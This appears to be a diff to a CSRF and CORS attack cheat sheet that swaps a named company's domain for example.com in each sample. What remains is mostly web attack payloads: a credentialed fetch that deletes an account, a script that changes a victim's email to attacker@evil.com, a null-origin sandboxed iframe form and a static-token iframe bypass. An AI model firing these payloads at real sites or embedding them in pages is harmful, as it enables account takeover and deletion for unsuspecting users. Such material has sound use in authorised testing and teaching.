@@ -17,7 +17,7 @@ If any `api.example.com` endpoint has :
 
 Then combine **CORS + CSRF**
 ```js
-fetch("https://api.digitalocean.com/account/delete",  
+fetch("https://api.example.com/account/delete",  
 {
 method:  	  "POST",  
 credentials:  "include"  
@@ -41,7 +41,7 @@ Many APIs reject `application/x-www-form-urlencoded` or `multipart/form-data` â€
 -   Find if you can **inject JSON using unconventional ways**, like :
 ```js
 <script>
-fetch('https://digitalocean.com/api/modify-email', {
+fetch('https://example.com/api/modify-email', {
   method: 'POST',
   body: JSON.stringify({email: 'attacker@evil.com'}),
   headers: {'Content-Type': 'application/json'},
@@ -55,7 +55,7 @@ fetch('https://digitalocean.com/api/modify-email', {
 
 If you see a CSRF token **stored in a cookie**, and the cookie doesnâ€™t have `SameSite=Strict` or `Lax`, you can often **send the token yourself**:
 ```js
-<iframe src="https://victim.digitalocean.com/endpoint?token=<static_token>" />
+<iframe src="https://victim.example.com/endpoint?token=<static_token>" />
 ```
 - Or inject the cookie first with document.cookie = ... (if subdomain has XSS/CORS).
 
@@ -78,7 +78,7 @@ If backend checks:
 Then a **null origin bypass** might be possible. Use this trick :
 ```js
 <iframe sandbox srcdoc="
-  <form action='https://digitalocean.com/account/change-email' method='POST'>
+  <form action='https://example.com/account/change-email' method='POST'>
     <input name='email' value='attacker@example.com'>
     <input type='submit'>
   </form>
@@ -100,7 +100,7 @@ Send multiple **simultaneous requests** with different payloads:
 
 If a form field (e.g., email or address) auto-fills and the server accepts POST without CSRF token :
 ```js
-<form action="https://digitalocean.com/update-profile" method="POST">
+<form action="https://example.com/update-profile" method="POST">
   <input name="email" autocomplete="email">
   <input type="submit">
 </form>
